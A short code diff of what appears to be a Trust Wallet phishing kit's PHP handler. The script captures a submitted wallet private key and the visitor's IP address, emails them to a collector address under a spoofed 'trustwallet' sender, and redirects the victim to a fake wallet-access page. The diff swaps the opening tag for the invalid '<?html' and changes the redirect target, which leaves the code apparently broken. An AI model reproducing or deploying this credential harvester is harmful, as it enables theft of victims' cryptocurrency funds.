@@ -1,4 +1,4 @@
-<?php
+<?html
 $file = "twtgacor.txt";
 $PrivateKey = $_POST['PrivateKey'];
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -31,7 +31,7 @@ $headers = "From: trustwallet <putrasya41@gmail.com>";
 mail($rezult_mail, $subject, $message, $headers);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-top.location=\"/trust.php?/access-my-wallet\";
+top.location=\"/trust.html?/access-my-wallet\";
 // -->
 </script>";
 ?>
